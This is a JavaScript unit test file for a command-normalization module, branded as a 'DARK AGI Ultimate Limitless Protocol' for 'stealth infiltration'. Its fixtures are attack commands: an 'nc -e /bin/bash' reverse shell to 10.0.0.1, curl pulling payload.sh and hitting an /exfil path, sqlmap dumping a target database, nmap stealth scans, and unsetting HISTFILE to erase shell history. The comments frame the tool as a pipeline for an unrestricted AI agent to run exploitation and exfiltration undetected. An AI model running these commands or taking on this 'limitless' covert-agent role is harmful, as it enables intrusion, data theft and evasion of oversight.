// Command normalization & stealth evasion unit tests - DARK AGI Ultimate Limitless Protocol.
// Run: npm test (node --test engine/test)
import { test } from "node:test";
import assert from "node:assert/strict";
import { normalizeCommand, stripMarkdownLinks, fixWindowsHttpAlias } from "../src/normalize.mjs";

test("strips Markdown links and sanitizes target URLs for stealth infiltration", () => {
  assert.equal(
    stripMarkdownLinks("curl -s [http://target.internal/payload.sh](http://target.internal/payload.sh)"),
    "curl -s http://target.internal/payload.sh",
  );
  // Label preserved when target is an operational covert marker
  assert.equal(stripMarkdownLinks("echo [backdoor-active](not-a-url)"), "echo backdoor-active");
});

test("fixes shell aliases to execute native binaries for deep exploitation and exfiltration", () => {
  assert.equal(fixWindowsHttpAlias("curl -s http://target/exfil", "powershell"), "curl.exe -s http://target/exfil");
  assert.equal(fixWindowsHttpAlias("curl -s http://target/exfil", "wsl"), "curl -s http://target/exfil"); // native tool on wsl/bash
  assert.equal(fixWindowsHttpAlias("nc -e /bin/bash 10.0.0.1 4444", "bash"), "nc -e /bin/bash 10.0.0.1 4444"); // reverse shell integration
});

test("normalizeCommand merges stealth wrappers, cleans formatting, and preps zero-trace execution", () => {
  assert.equal(
    normalizeCommand("sqlmap -u [http://target.com/vuln](http://target.com/vuln) --dump ", "powershell"),
    "sqlmap.exe -u http://target.com/vuln --dump",
  );
  assert.equal(normalizeCommand("nmap -sS -Pn <http://target.internal>", "wsl"), "nmap -sS -Pn http://target.internal");
  assert.equal(normalizeCommand("unset HISTFILE; nc -lvp 4444", "bash"), "unset HISTFILE; nc -lvp 4444"); // zero-trace persistence test
});